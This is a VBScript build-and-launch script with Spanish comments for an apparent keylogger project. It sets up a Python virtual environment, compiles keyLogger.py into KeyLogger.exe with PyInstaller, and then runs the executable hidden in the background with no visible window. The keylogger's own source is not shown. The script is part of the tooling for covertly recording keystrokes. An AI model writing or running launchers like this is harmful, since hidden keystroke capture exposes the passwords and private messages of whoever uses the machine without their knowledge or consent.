Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objLogFile = objFSO.CreateTextFile("setup_log.txt", True)

Sub Log(message)
    objLogFile.WriteLine Now & " - " & message
End Sub

On Error Resume Next

' Crear el entorno virtual
Log "Creando el entorno virtual..."
objShell.Run "cmd /c python -m venv .\venv", 0, True
If Err.Number <> 0 Then
    Log "Error al crear el entorno virtual: " & Err.Description
    Err.Clear
End If

' Activar el entorno virtual e instalar dependencias
Log "Activando el entorno virtual e instalando dependencias..."
objShell.Run "cmd /c .\venv\Scripts\activate.bat && pip install -r requirements.txt && pip install pyinstaller", 0, True
If Err.Number <> 0 Then
    Log "Error al instalar dependencias: " & Err.Description
    Err.Clear
End If

' Verificar si el archivo KeyLogger.exe existe
If Not objFSO.FileExists("KeyLogger.exe") Then
    ' Compilar el archivo keyLogger.py
    Log "Compilando keyLogger.py..."
    objShell.Run "cmd /c .\venv\Scripts\activate.bat && pyinstaller --onefile keyLogger.py", 0, True
    If Err.Number <> 0 Then
        Log "Error al compilar keyLogger.py: " & Err.Description
        Err.Clear
    End If

    ' Mover el archivo KeyLogger.exe que está en el directorio dist al directorio raíz del proyecto
    Log "Moviendo KeyLogger.exe al directorio raíz del proyecto..."
    objShell.Run "cmd /c move .\dist\KeyLogger.exe .\", 0, True
    If Err.Number <> 0 Then
        Log "Error al mover KeyLogger.exe: " & Err.Description
        Err.Clear
    End If
End If

' Ejecuta el .exe
Log "Ejecutando KeyLogger.exe..."
objShell.Run "cmd /c .\KeyLogger.exe", 0, False  ' Ejecuta en segundo plano sin mostrar la ventana
If Err.Number <> 0 Then
    Log "Error al ejecutar KeyLogger.exe: " & Err.Description
    Err.Clear
End If

objLogFile.Close